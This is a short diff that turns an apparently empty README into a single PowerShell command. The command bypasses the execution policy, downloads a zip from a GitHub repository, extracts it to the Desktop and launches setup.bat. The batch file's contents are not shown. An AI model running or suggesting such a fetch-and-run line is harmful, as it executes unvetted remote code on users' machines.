@@ -1,2 +1,1 @@
-# file-install
-nothing
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://github.com/TuanDarcy/file-install/archive/refs/heads/main.zip' -OutFile '%TEMP%\kaitun.zip' -UseBasicParsing; Expand-Archive '%TEMP%\kaitun.zip' -DestinationPath '%USERPROFILE%\Desktop\' -Force; Start-Process '%USERPROFILE%\Desktop\file-install-main\setup.bat'"
